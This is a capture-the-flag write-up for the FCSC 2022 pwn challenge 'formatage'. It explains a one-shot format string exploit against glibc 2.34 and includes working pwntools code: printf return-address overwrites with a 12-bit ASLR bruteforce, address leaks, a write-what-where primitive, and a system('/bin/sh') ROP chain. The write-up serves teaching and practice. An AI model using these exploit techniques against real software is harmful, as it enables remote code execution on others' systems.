# formatage



- Category: `pwn`
- Points: `500` => `493`
- Difficulty: :star: :star: :star:
- Solves: `4`
- :2nd_place_medal: 2nd to solve it



**Description**

> Vous devez lire le fichier `flag.txt` situé sur le serveur distant. 
>
> `nc challenges.france-cybersecurity-challenge.fr 2057` 
>
> **Note :** le binaire à exploiter n'a pas accès à Internet.



**Attachments**

- `formatage`
- `libc.2-34.so`

### :book: Introduction

`formatage` was a fun and quite hard challenge from XeR. The challenger basically had to exploit a one-shot format string in one of its hardest form.

**TL;DR**

- Abuse `**` pointers on the stack to create a valid stack address of our choice inside the stack 
- 12-bits ASLR bruteforce to overwrite the `printf` return address, and loop in main
- Leak everything we need

- Construct a Write-What-Where primitive
- Write ROP chain on the stack
- Overwrite  `printf` return address by a stack-shifting gadget
- Return into our ROP chain and get a shell :D



### :arrows_counterclockwise: Reversing the program

We can starts analyzing the binary with some utilities:

```
$ file formatage
formatage: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /home/n7student/Documents/CTF/FCSC2022/pwn/formatage/lib/ld-2.34.so, BuildID[sha1]=39a11f9a8688c39d7943b084fb7a6f81617573b9, for GNU/Linux 3.2.0, stripped

$ checksec ./formatage
[*] '/home/n7student/Documents/CTF/FCSC2022/pwn/formatage/formatage'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All the protections are enabled, well I'm not so surprised :D.



We then fire Ghidra to start reverse-engineering the program:

```c
int main(int argc,char **argv)

{
  long in_FS_OFFSET;
  char *string;
  size_t size;
  undefined8 canary;
  
  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);
  string = (char *)0x0;
  size = 0;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  getline(&string,&size,stdin);
  printf(string);
  if (string != (char *)0x0) {
    free(string);
  }
  string = (char *)0x0;
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

The program is very simple and actually fits inside a single `main` function.

Well, that was some overkill :sweat_smile:

​	![img](https://i.imgflip.com/6fd9kn.jpg)



The binary simply reads a line from stdin with `getline`, calls `printf` with our input as parameter, `free` the `getline`-allocated buffer and calls `exit(0)`.

There is an obvious format string vulnerability with the `printf` call, but the exploitation won't be as easy as it seems :smiling_imp:.

Let's summarize what we've understood from the binary:

- The `getline` function allocates a buffer on the heap, with our input
  - The buffer is not on the stack, which makes the exploitation of the format string vulnerability harder (but not impossible !)
- The `free` function is called right after the `printf` call.
  - `free` is generally a good target to gain arbitrary code execution, as writeble hooks are present in the glibc.
  - However, the given libc is the `2.34` version, which is game-changing for pwnable CTF challenges, as `__free_hook`, `__malloc_hook`, and `__realloc_hook` were simply [removed from the API](https://sourceware.org/pipermail/libc-alpha/2021-August/129718.html).
- The binary explicitly calls `exit(0)`, which prevents us to just overwrite the return address of the main function.



Well, now *how the hell are we supposed to exploit that*.



### :recycle: Make the program loops

First, we have to find a way to make the `main` function looping on itself to make the exploitation easier (well, not just "easier" it's mandatory).

After spending some time looking for CTF writeups of similar challenges, I came across a writeup ([Blind Shot from TokyoWesterns 2020](https://ctftime.org/writeup/24611)) that referenced [this presentation slides on format string attacks](https://j00ru.vexillium.org/slides/2015/insomnihack.pdf#page=98) from j00ru.

The slide presented a technique that aimed at overwriting the return address of the `printf` function, indeed, with a format string vulnerability, we can write arbitrary data to memory, and as we are still inside the context of the `printf` function, we are free to overwrite it's return address!

With that technique, we'll just have to overwrite the `printf` return address by the `main` start address.



However, there is still a problem. The `getline` buffer is not stored on the stack, but on the heap. As format string arguments are stored firstly on registers, then on the stack, we have to find a way to write arbitrary addresses on the stack.

So, we'll have to work with what is **already** stored on the stack.



But what is currently on the stack ? We can fire GDB to analyze stack memory, right after stepping inside the `printf` call.

`0x7ffcef060ee8` points to the return address of the `printf` call.

```
0x7ffcef060ee8:	0x000056082cf7f25b	0x0000000000000000
0x7ffcef060ef8:	0x000056082e5c62a0	0x0000000000000078
0x7ffcef060f08:	0x68d2879bb65beb00	0x0000000000000001
0x7ffcef060f18:	0x00007feb3940dfd0	0x000056082cf7e040
0x7ffcef060f28:	0x000056082cf7f1c9	0x0000000100000000
0x7ffcef060f38:	0x00007ffcef061038	0x0000000000000000
0x7ffcef060f48:	0x04f008845038fba1	0x00007ffcef061038
0x7ffcef060f58:	0x000056082cf7f1c9	0x0000000000000000
0x7ffcef060f68:	0x00007feb3963dc40	0xfb09d6884e7afba1
0x7ffcef060f78:	0xfb267a05ef32fba1	0x00007feb00000000
0x7ffcef060f88:	0x0000000000000000	0x0000000000000000
0x7ffcef060f98:	0x0000000000000000	0x0000000000000000
0x7ffcef060fa8:	0x68d2879bb65beb00	0x0000000000000000
0x7ffcef060fb8:	0x00007feb3940e07d	0x0000000000000000
0x7ffcef060fc8:	0x00007ffcef061048	0x000056082cf81da0
0x7ffcef060fd8:	0x00007ffcef061048	0x00007feb39640220
0x7ffcef060fe8:	0x0000000000000000	0x0000000000000000
0x7ffcef060ff8:	0x000056082cf7f0e0	0x00007ffcef061030
0x7ffcef061008:	0x0000000000000000	0x0000000000000000
0x7ffcef061018:	0x000056082cf7f105	0x00007ffcef061028
0x7ffcef061028:	0x000000000000001c	0x0000000000000001
0x7ffcef061038:	0x00007ffcef062f7a	0x0000000000000000
0x7ffcef061048:	0x00007ffcef062fb9	0x00007ffcef062fc9
0x7ffcef061058:	0x00007ffcef06301d	0x00007ffcef0630b3
0x7ffcef061068:	0x00007ffcef0630c6	0x00007ffcef063104
0x7ffcef061078:	0x00007ffcef063118	0x00007ffcef063145
0x7ffcef061088:	0x00007ffcef063186	0x00007ffcef06319d
0x7ffcef061098:	0x00007ffcef0631c9	0x00007ffcef063204
```

Now, the hard part begins, be ready.

With this stack dump, we can start finding pointers of form `**`, which points on a stack address. Thus we can overwrite the lower part of these pointers to craft others valid stack pointers to overwrite arbitrary data on the stack (here we want to overwrite the stored return address of `printf`) .

For example, we can find some pointers that fulfill these conditions.

- [Offset **15** in the format string] `0x7ffcef060f38`=> `0x00007ffcef061038` (Offset **47** in the format string) 
- [Offset **18** in the format string] `0x7ffcef060f50` => `0x00007ffcef061038` (Offset **47** in the format string) 
- [Offset **33** in the format string] `0x7ffcef060fc8` => `0x00007ffcef061048 `(Offset **49** in the format string) 
- [Offset **35** in the format string] `0x7ffcef060fd8` => `0x00007ffcef061048 `(Offset **49** in the format string) 

Our target is the `printf` return address (`0x7ffcef060ee8`). We can modify the lower part of the pointer pointed by  `0x7ffcef060f38`, to make it correspond with the `printf` return address:

```
0x7ffcef060f38 => 0x00007ffcef061038
Write 0x0ee8 at offset 15 => 0x7ffcef060ee8 => return address
```

We can then overwrite the LSB of the newly crafted pointer at offset **47**, to overwrite the `printf` return address:

```
0x7ffcef060ee8:	0x000056082cf7f25b
Write 0x30 at offset 47 => 0x7ffcef060ee8:	0x000056082cf7f230
```

This allows us to get back in the `main` function after returning of the `printf` function!

We can then take advantage of the return to leak some useful addresses. By analyzing the stack dump we can find some code pointers, along with libc and stack ones. We append some `%X$p` formatters at the end of our format string to leak them.

Here is the code in my exploit that implements that:

```python
PIVOT_OFFSET = 15
RET_ADDR_OFFSET = 47

# Arbitrary partial address, we'll need a 12-bit ASLR bruteforce 
# once running the exploit remotely 
ret_addr_partial = 0x1f38 

target = (0x30 - (ret_addr_partial & 0xff)) & 0xff

log.success('target is @ %s' % hex(target))

# Overwrite partial stack pointer
fmt = '%c'*(PIVOT_OFFSET - 2) + f'%{ret_addr_partial - (PIVOT_OFFSET - 2)}c' + '%hn' 
fmt += f'%{target}c%{RET_ADDR_OFFSET}$hhn' # place 0x30 to the printf return address
fmt += '____' + '-'.join(['%12$p', '%7$p', '%11$p', '%15$p'])

r.sendline(fmt)

r.recvuntil('____')
leaks = r.recv().strip().split(b'-')

code_base = int(leaks[0], 16) - 0x40
heap_base = int(leaks[1], 16) - 0x2a0
libc_base = int(leaks[2], 16) - 0x2dfd0
env_base = int(leaks[3], 16) + 0x10

log.success('code base is @ %s' % hex(code_base))
log.success('heap base is @ %s' % hex(heap_base))
log.success('libc base is @ %s' % hex(libc_base))
log.success('env is @ %s' % hex(env_base))
```



Wow, that was rough.. And that's only the beginning :smiling_imp:

Now that we are able to loop infinitely in the main function, what can we do next ?



### :dart: Setting up a write-what-where primitive

To make the exploitation more reliable and easier, we can start to set up a write-what-where primitive.

The idea I had is to craft a "pointers table" that will allow us to forge an arbitrary address on the stack by writing consecutive words into the "pointers" table. 

Let's take an example:

I want to write **0xdeadbeefcafebabe** on the stack.

I'll start to craft 4 pointers (starting at `0x7ffcef061048` for example) that will each point to an address part (which will be located at `0x7ffcef061068` for example)

```
0x7ffcef061038:	0x00007ffcef062f7a	0x0000000000000000
0x7ffcef061048:	0x00007ffcef061068	0x00007ffcef06106a
0x7ffcef061058:	0x00007ffcef06106c	0x00007ffcef06106e
0x7ffcef061068:	0x00007ffcef0630c6	0x00007ffcef063104
0x7ffcef061078:	0x00007ffcef063118	0x00007ffcef063145
```

We have:

- `0x7ffcef061048` => `0x00007ffcef061068`
- `0x7ffcef061050` => `0x00007ffcef06106a`
- `0x7ffcef061058` => `0x00007ffcef06106c`
- `0x7ffcef061060` => `0x00007ffcef06106e`



We can then craft our target address `0xdeadbeefcafebabe` word by word, by exploiting the format string 4 times to write a word to `0x00007ffcef061068`, `0x00007ffcef06106a`, `0x00007ffcef06106c` and so on...

```
Write 0xbabe at offset X   => 0x00007ffcef061068:	0x00007ffcef06babe
Write 0xcafe at offset X+1 => 0x00007ffcef061068:	0x00007ffccafebabe
Write 0xbeef at offset X+2 => 0x00007ffcef061068:	0x0000beefcafebabe
Write 0xdead at offset X+3 => 0x00007ffcef061068:	0xdeadbeefcafebabe
```

We will then have our custom address stored at offset `X+4`, which allows us to have an arbitrary write primitive!

Here is the code that is implementing this technique:

```python
# Setup pointers table

for i in range(4):
    env_ptr_partial = (env_base + 8 * (i + 1)) & 0xffff
    target = (0x30 - (env_ptr_partial & 0xff)) & 0xff
    fmt = '%c'*(ENV_PIVOT_OFFSET - 2) + f'%{env_ptr_partial - (ENV_PIVOT_OFFSET - 2)}c' + '%hn'
    # We still have to overwrite the printf return address to loop again
    fmt += f'%{target}c%{RET_ADDR_OFFSET}$hhn'

    r.sendline(fmt)

    # ENV_PIVOT_OFFSET -> &WHERE_TABLE[i]

    forge_ptr_partial = (env_base + 8*5 + 2*i) & 0xffff
    target = 0x30

    fmt = '%c'*(RET_ADDR_OFFSET - 2) + f'%{target - (RET_ADDR_OFFSET - 2)}c' + '%hhn'
    fmt += f'%{forge_ptr_partial - target}c%{WHERE_PTR_OFFSET}$hn'

    r.sendline(fmt)
    
FORGE_PTR_OFFSET = 50
ARBWRITE_PTR_OFFSET = 54

# Allows us to create an arbitrary address at offset 54
def forge_addr(where):
    for i in range(4):
        # We still have to overwrite the printf return address to loop again
        target = 0x30
        where_part = (((where >> 16*i) & 0xffff) - target) & 0xffff
        fmt = '%c'*(RET_ADDR_OFFSET - 2) + f'%{target - (RET_ADDR_OFFSET - 2)}c' + '%hhn'
        fmt += f'%{where_part}c%{FORGE_PTR_OFFSET + i}$hn'

        r.sendline(fmt)
      
# Arbitrary Write (1 word) primitive
def write16(where, what):
    what &= 0xffff

    forge_addr(where)

    target = 0x30
    target_what = (what - target) & 0xffff

    fmt = '%c'*(RET_ADDR_OFFSET - 2) + f'%{target - (RET_ADDR_OFFSET - 2)}c' + '%hhn'
    fmt += f'%{target_what}c%{ARBWRITE_PTR_OFFSET}$hn'

    r.sendline(fmt)

# Arbitrary Write (1 qword) primitive
def write64(where, what):
    for i in range(4):
        write16(where + 2*i, (what >> 16*i) & 0xffff)
```



### :bomb: Getting arbitrary code execution

Now that we have superpowers, we have to find a way to get code execution!

When starting this challenge, I immediately remembered the challenge `fsbaas` from the CTF `ECW Quals 2021`, which has a similar setup (no `__free_hook` overwrite and so on). The trick was to abuse [printf custom formatters](https://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html), to craft fake `__printf_function_table` and `__printf_arginfo_table` tables to finally call a `shell` function.

I started to implement it, but it sounded kind of too complicated for our simple needs, so I changed my strategy.



Let's summarize what we've got now:

- `PIE`,  `heap`, `libc`, `stack` leaks
- Arbitrary Write in memory
- Arbitrary return address overwrite



What if we could just find some *voodoo* gadget to return into our hand-crafted ROP chain ?

Indeed, we cannot just overwrite the memory next to the `printf` return address with our ROP chain in one shot (well theoretically we can, but I'm lazy :sleeping:).

We fire ROPgadget, and starts diving into the libc gadgets (the binary hasn't got a lot of gadgets).

After spending some time hunting for *fancy* JOP / COP gadgets, I saw a simple, stupid `add rsp, 0x30 ; ret` gadget. Which is just PERFECT for our needs!

We can just write our ROP chain upper in the stack, and finally overwrite the return address of `printf` by a `add rsp, 0xXX ; ret` gadget, which will gently return in our evil ROP chain :smiling_imp:.



```python
# Craft the ropchain on the stack

pop_rdi = libc_base + 0x000000000002e6c5 # pop rdi ; ret
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
system_addr = libc_base + libc.sym['system']

shift_stack_addr = libc_base + 0x00000000000474c7 # add rsp, 0xa8 ; ret

rop_addr = env_base - 0xb0

# Write the ROP chain in the stack
write64(rop_addr, pop_rdi + 1)
rop_addr += 8
write64(rop_addr, pop_rdi)
rop_addr += 8
write64(rop_addr, binsh_addr)
rop_addr += 8
write64(rop_addr, system_addr)
```



Now we have to solve a final problem: we have to overwrite the `printf` return address in one shot to overwrite it with a libc pointer (which necessitates 6 bytes overwrite). We just place the needed pointers on the stack, and write words to it to replace the `printf` return address by our gadget address:

```python
# Prepare pointers for whole ret_addr overwrite

ret_addr = env_base - 0x160 # printf return address pointer
write64(env_base + 8*0x10, ret_addr + 2)
write64(env_base + 8*0x11, ret_addr + 4)

FINAL_RET_OFFSET = WHERE_PTR_OFFSET + 0x10 # Offset of the return address parts

target1 = shift_stack_addr & 0xffff
target2 = (shift_stack_addr >> 16) & 0xffff
target3 = (shift_stack_addr >> 32) & 0xffff

fmt = f'%{target1}c%{RET_ADDR_OFFSET}$hn'
fmt += f'%{(target2 - target1) & 0xffff}c%{FINAL_RET_OFFSET}$hn'
fmt += f'%{(target3 - target2) & 0xffff}c%{FINAL_RET_OFFSET + 1}$hn'

r.sendline(fmt)

r.sendline('id')
r.recv()

log.success('Enjoy your shell :)')

r.interactive()
```



The remote exploit takes some time, as we need to bruteforce 12 bits of ASLR to get a valid `printf` return address pointer.



Flag: `FCSC{8f1038be95c111447ed7a77492a7c03d465439119c084cf8d867e2d9b8bafcc4}`



### :checkered_flag: Conclusion

`formatage` was a very cool challenge about format strings, that really helped me to deeply understand the tricks about format string vulnerabilities. Thanks to its creator!